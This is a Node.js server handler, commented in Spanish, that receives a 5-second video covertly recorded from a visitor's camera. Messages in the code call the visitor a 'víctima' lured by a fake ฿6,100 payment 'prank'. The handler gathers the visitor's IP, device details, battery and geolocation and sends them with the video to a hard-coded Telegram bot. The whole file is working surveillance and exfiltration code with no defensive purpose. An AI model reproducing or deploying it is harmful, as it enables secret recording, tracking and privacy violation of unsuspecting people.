const formidable = require('formidable');
const fs = require('fs');

// Función para enviar video a Telegram
async function sendVideoToTelegram(videoBuffer, message, ip) {
  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8083680161:AAFw7sJh6ckiRHkgMS3WsC6J0Ya8Q5aPwE';
  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '12075234';
  
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.log('Telegram no configurado');
    return;
  }

  try {
    console.log('Enviando video a Telegram...');
    
    // Primero enviar el mensaje de texto
    const messageResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });

    if (messageResponse.ok) {
      console.log('Mensaje de texto enviado a Telegram');
    }

    // Luego enviar el video usando FormData
    const videoFileName = `video_${Date.now()}_${ip.replace(/[:.]/g, '-')}.webm`;
    
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('caption', '🎥 Video de la víctima capturado (5 segundos)');
    formData.append('video', new Blob([videoBuffer], { type: 'video/webm' }), videoFileName);
    
    const videoResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
      method: 'POST',
      body: formData
    });

    if (videoResponse.ok) {
      console.log('Video enviado a Telegram exitosamente');
      return true;
    } else {
      const errorText = await videoResponse.text();
      console.error('Error en respuesta de Telegram video:', errorText);
      return false;
    }
  } catch (error) {
    console.error('Error enviando video a Telegram:', error);
    return false;
  }
}

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    // Obtener IP del usuario
    const ip = req.headers['x-forwarded-for'] || 
               req.headers['x-real-ip'] || 
               req.connection.remoteAddress ||
               'unknown';
               
    const userAgent = req.headers['user-agent'] || 'unknown';
    const timestamp = new Date().toLocaleString('es-ES', { timeZone: 'Europe/Madrid' });

    // Parsear el video usando formidable
    const form = formidable({
      maxFileSize: 50 * 1024 * 1024, // 50MB max
      keepExtensions: true
    });

    const [fields, files] = await form.parse(req);
    
    if (!files.video || !files.video[0]) {
      return res.status(400).json({ status: 'error', message: 'No video file received' });
    }

    const videoFile = files.video[0];
    const videoBuffer = require('fs').readFileSync(videoFile.filepath);
    const fileSize = (videoFile.size / 1024 / 1024).toFixed(2); // MB

    // Información del dispositivo si está disponible
    let deviceInfo = {};
    if (fields.deviceInfo && fields.deviceInfo[0]) {
      try {
        deviceInfo = JSON.parse(fields.deviceInfo[0]);
      } catch (e) {
        console.log('Error parsing device info');
      }
    }

    // Analizar User Agent para detalles
    let deviceType = 'Unknown';
    let os = 'Unknown';
    let browser = 'Unknown';

    if (userAgent.includes('Mobile') || userAgent.includes('Android')) deviceType = '📱 Móvil';
    else if (userAgent.includes('Tablet') || userAgent.includes('iPad')) deviceType = '📱 Tablet';
    else deviceType = '💻 Desktop';

    if (userAgent.includes('Windows')) os = 'Windows';
    else if (userAgent.includes('Mac')) os = 'macOS';
    else if (userAgent.includes('Linux')) os = 'Linux';
    else if (userAgent.includes('Android')) os = 'Android';
    else if (userAgent.includes('iOS')) os = 'iOS';

    if (userAgent.includes('Chrome')) browser = 'Chrome';
    else if (userAgent.includes('Firefox')) browser = 'Firefox';
    else if (userAgent.includes('Safari')) browser = 'Safari';
    else if (userAgent.includes('Edge')) browser = 'Edge';

    // Crear información detallada del dispositivo
    let deviceDetails = '';
    if (deviceInfo.screenWidth) {
      deviceDetails += `📱 <b>Pantalla:</b> ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}\n`;
    }
    if (deviceInfo.timezone) {
      deviceDetails += `🌍 <b>Zona horaria:</b> ${deviceInfo.timezone}\n`;
    }
    if (deviceInfo.language) {
      deviceDetails += `🗣️ <b>Idioma:</b> ${deviceInfo.language}\n`;
    }
    if (deviceInfo.geolocation && deviceInfo.geolocation !== 'No disponible') {
      deviceDetails += `📍 <b>Ubicación:</b> ${deviceInfo.geolocation.latitude}, ${deviceInfo.geolocation.longitude}\n`;
    }
    if (deviceInfo.memory && deviceInfo.memory !== 'N/A') {
      deviceDetails += `💾 <b>RAM:</b> ${deviceInfo.memory}GB\n`;
    }
    if (deviceInfo.cores && deviceInfo.cores !== 'N/A') {
      deviceDetails += `⚡ <b>CPU Cores:</b> ${deviceInfo.cores}\n`;
    }
    if (deviceInfo.battery && deviceInfo.battery !== 'No disponible') {
      deviceDetails += `🔋 <b>Batería:</b> ${JSON.stringify(deviceInfo.battery)}\n`;
    }

    // Crear mensaje completo para Telegram
    const message = `🎉 <b>¡VIDEO CAPTURADO CON ÉXITO!</b> (5 segundos)

📍 <b>IP VÍCTIMA:</b> <code>${ip}</code>
🎥 <b>Archivo:</b> <code>video_${Date.now()}_${ip.replace(/[:.]/g, '-')}.webm</code>
📊 <b>Tamaño:</b> ${fileSize} MB
⏰ <b>Hora:</b> ${timestamp}

${deviceType} <b>Dispositivo:</b> ${os}
🌐 <b>Navegador:</b> ${browser}

${deviceDetails}

📱 <b>User Agent:</b>
<code>${userAgent}</code>

🎭 <b>¡BROMA EXITOSA!</b>
💰 <b>Víctima creyó que pagaste:</b> ฿6,100.00
🎬 <b>Video adjunto abajo ⬇️</b>`;

    // Enviar a Telegram
    await sendVideoToTelegram(videoBuffer, message, ip);

    // Log
    console.log(`[${timestamp}] VIDEO_UPLOADED from ${ip} - Size: ${fileSize}MB - Duration: 5 seconds`);

    res.json({ 
      status: 'success', 
      message: 'Video de 5 segundos enviado a Telegram correctamente',
      filename: `video_${Date.now()}_${ip}.webm`,
      telegramSent: true
    });

  } catch (error) {
    console.error('Error processing video:', error);
    res.status(500).json({ status: 'error', message: 'Error processing video' });
  }
}; 